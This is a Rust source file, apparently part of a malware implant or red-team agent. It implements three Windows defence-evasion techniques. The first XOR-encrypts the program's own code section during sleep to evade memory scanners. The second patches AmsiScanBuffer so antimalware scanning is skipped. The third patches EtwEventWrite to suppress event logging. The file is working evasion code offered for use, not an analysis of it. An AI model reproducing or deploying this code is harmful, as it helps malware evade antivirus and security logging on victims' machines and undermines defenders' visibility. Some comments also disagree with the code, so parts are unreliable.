use log::{info, debug};

pub struct SleepObfuscation;

impl SleepObfuscation {
    /// Encrypt agent memory regions during sleep to evade memory scanners.
    /// Uses VirtualProtect to make regions RW, XORs with random key, sleeps, then decrypts and restores RX.
    #[cfg(target_os = "windows")]
    pub fn obfuscated_sleep(duration_ms: u64) {
        use std::time::Duration;
        use std::thread;

        unsafe {
            use winapi::um::memoryapi::VirtualProtect;
            use winapi::um::winnt::{PAGE_READWRITE, PAGE_EXECUTE_READ};

            // Get the base address of the .text section (our executable code)
            let module = winapi::um::libloaderapi::GetModuleHandleA(std::ptr::null());
            if module.is_null() {
                thread::sleep(Duration::from_millis(duration_ms));
                return;
            }

            // Read the PE header to find .text section
            let dos_header = module as *const u8;
            let e_lfanew = *(dos_header.add(0x3C) as *const u32) as usize;
            let nt_headers = dos_header.add(e_lfanew);
            let section_count = *(nt_headers.add(6) as *const u16) as usize;
            let optional_header_size = *(nt_headers.add(20) as *const u16) as usize;
            let first_section = nt_headers.add(24 + optional_header_size);

            let mut text_addr: *mut u8 = std::ptr::null_mut();
            let mut text_size: usize = 0;

            for i in 0..section_count {
                let section = first_section.add(i * 40);
                let name = std::slice::from_raw_parts(section, 8);
                if name.starts_with(b".text") {
                    let virtual_size = *(section.add(8) as *const u32) as usize;
                    let virtual_addr = *(section.add(12) as *const u32) as usize;
                    text_addr = dos_header.add(virtual_addr) as *mut u8;
                    text_size = virtual_size;
                    break;
                }
            }

            if text_addr.is_null() || text_size == 0 {
                thread::sleep(Duration::from_millis(duration_ms));
                return;
            }

            // Generate XOR key
            let key: u8 = (duration_ms % 251 + 1) as u8;

            // Change to RW
            let mut old_protect: u32 = 0;
            if VirtualProtect(text_addr as _, text_size, PAGE_READWRITE, &mut old_protect) == 0 {
                thread::sleep(Duration::from_millis(duration_ms));
                return;
            }

            // XOR encrypt the .text section
            let slice = std::slice::from_raw_parts_mut(text_addr, text_size);
            for byte in slice.iter_mut() {
                *byte ^= key;
            }

            debug!("Sleep obfuscation: encrypted {} bytes, sleeping {}ms", text_size, duration_ms);

            // Sleep
            thread::sleep(Duration::from_millis(duration_ms));

            // Decrypt
            for byte in slice.iter_mut() {
                *byte ^= key;
            }

            // Restore execute permissions
            VirtualProtect(text_addr as _, text_size, old_protect, &mut old_protect);
            debug!("Sleep obfuscation: decrypted and restored");
        }
    }

    #[cfg(not(target_os = "windows"))]
    pub fn obfuscated_sleep(duration_ms: u64) {
        std::thread::sleep(std::time::Duration::from_millis(duration_ms));
    }
}

pub struct AmsiBypass;

impl AmsiBypass {
    /// Patch AMSI (Antimalware Scan Interface) to prevent script scanning.
    /// Overwrites AmsiScanBuffer to return AMSI_RESULT_CLEAN.
    #[cfg(target_os = "windows")]
    pub fn patch() -> Result<String, String> {
        unsafe {
            use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress, LoadLibraryA};
            use winapi::um::memoryapi::VirtualProtect;
            use winapi::um::winnt::PAGE_EXECUTE_READWRITE;
            use std::ffi::CString;

            let amsi_dll = CString::new("amsi.dll").unwrap();
            let mut module = GetModuleHandleA(amsi_dll.as_ptr());
            if module.is_null() {
                module = LoadLibraryA(amsi_dll.as_ptr());
                if module.is_null() {
                    return Err("AMSI not loaded".to_string());
                }
            }

            let func_name = CString::new("AmsiScanBuffer").unwrap();
            let func_addr = GetProcAddress(module, func_name.as_ptr());
            if func_addr.is_null() {
                return Err("AmsiScanBuffer not found".to_string());
            }

            // mov eax, 0x80070057 (E_INVALIDARG) + ret — causes AMSI to skip scan
            let patch: [u8; 6] = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];

            let mut old_protect: u32 = 0;
            if VirtualProtect(func_addr as _, patch.len(), PAGE_EXECUTE_READWRITE, &mut old_protect) == 0 {
                return Err("VirtualProtect failed".to_string());
            }

            std::ptr::copy_nonoverlapping(patch.as_ptr(), func_addr as *mut u8, patch.len());

            VirtualProtect(func_addr as _, patch.len(), old_protect, &mut old_protect);

            info!("AMSI bypass: patched AmsiScanBuffer");
            Ok("AMSI patched successfully".to_string())
        }
    }

    #[cfg(not(target_os = "windows"))]
    pub fn patch() -> Result<String, String> {
        Ok("AMSI bypass: not applicable on this platform".to_string())
    }
}

pub struct EtwBypass;

impl EtwBypass {
    /// Patch ETW (Event Tracing for Windows) to prevent event logging.
    #[cfg(target_os = "windows")]
    pub fn patch() -> Result<String, String> {
        unsafe {
            use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
            use winapi::um::memoryapi::VirtualProtect;
            use winapi::um::winnt::PAGE_EXECUTE_READWRITE;
            use std::ffi::CString;

            let ntdll = CString::new("ntdll.dll").unwrap();
            let module = GetModuleHandleA(ntdll.as_ptr());
            if module.is_null() {
                return Err("ntdll.dll not found".to_string());
            }

            let func_name = CString::new("EtwEventWrite").unwrap();
            let func_addr = GetProcAddress(module, func_name.as_ptr());
            if func_addr.is_null() {
                return Err("EtwEventWrite not found".to_string());
            }

            // ret 0x14 (return with stack cleanup)
            let patch: [u8; 1] = [0xC3]; // simple ret

            let mut old_protect: u32 = 0;
            if VirtualProtect(func_addr as _, patch.len(), PAGE_EXECUTE_READWRITE, &mut old_protect) == 0 {
                return Err("VirtualProtect failed".to_string());
            }

            std::ptr::copy_nonoverlapping(patch.as_ptr(), func_addr as *mut u8, patch.len());

            VirtualProtect(func_addr as _, patch.len(), old_protect, &mut old_protect);

            info!("ETW bypass: patched EtwEventWrite");
            Ok("ETW patched successfully".to_string())
        }
    }

    #[cfg(not(target_os = "windows"))]
    pub fn patch() -> Result<String, String> {
        Ok("ETW bypass: not applicable on this platform".to_string())
    }
}
